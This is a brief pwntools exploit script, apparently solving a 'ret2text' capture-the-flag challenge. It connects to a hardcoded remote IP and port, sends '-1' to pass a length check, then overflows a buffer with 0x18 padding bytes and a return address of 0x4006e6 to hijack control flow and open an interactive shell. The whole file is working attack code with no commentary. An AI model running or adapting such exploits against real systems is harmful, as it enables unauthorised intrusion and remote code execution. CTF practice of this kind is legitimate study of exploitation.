from pwn import *

#p=process('ret2text')
p=remote('47.106.177.170',20000)
sys=p64(0x4006e6)
p.sendline('-1')
payload='a'*0x10+'a'*8+sys

p.sendline(payload)
p.interactive()

